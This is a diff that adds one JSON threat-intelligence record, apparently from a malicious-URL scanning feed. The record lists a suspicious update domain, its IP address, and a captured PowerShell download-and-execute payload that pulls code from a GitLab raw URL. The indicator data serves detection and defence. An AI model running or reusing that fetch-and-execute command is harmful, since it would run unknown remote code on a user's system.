@@ -1,1 +1,22 @@
-[]
+[
+  {
+    "UrlDomain": "update.sportela.bg",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "78.142.63.182"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
+    "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
+  }
+]
